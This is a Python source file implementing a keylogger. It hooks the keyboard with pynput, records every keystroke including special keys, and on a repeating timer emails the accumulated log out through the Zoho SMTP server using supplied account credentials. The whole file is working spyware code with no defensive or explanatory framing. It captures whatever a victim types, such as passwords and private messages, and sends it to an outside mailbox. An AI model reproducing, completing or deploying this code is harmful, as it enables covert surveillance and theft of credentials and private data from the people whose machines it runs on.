import smtplib
import pynput.keyboard
import threading

# Global variable to hold Keystrokes
class Keylogger:
    def __init__(self, time_interval, email, password):
        # Initialize the listener and the timer
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

    def process_key_press(self, key):
        try:
            # Handle printable characters
            current_key = key.char if key.char else ""
        except AttributeError:
            # Handle special keys (including space, shift, enter, etc.)
            if key == pynput.keyboard.Key.space:
                current_key = " "  # For space key
            else:
                current_key = f" [{str(key)}] "  # For other special keys (e.g., shift, ctrl, etc.)

        # Append the processed key to the log
        self.log += current_key

    # Create a report thread to send keylog
    def report(self):
        print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        # Start a new timer
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Send Log via email
    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.zoho.com", 587)  # Changed to Zoho SMTP
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Start the keylogger
    def start(self):
        # Start the listener and the reporting thread
        self.report()  # Start reporting
        with self.keyboard_listener:
            self.keyboard_listener.join()  # Join listener thread
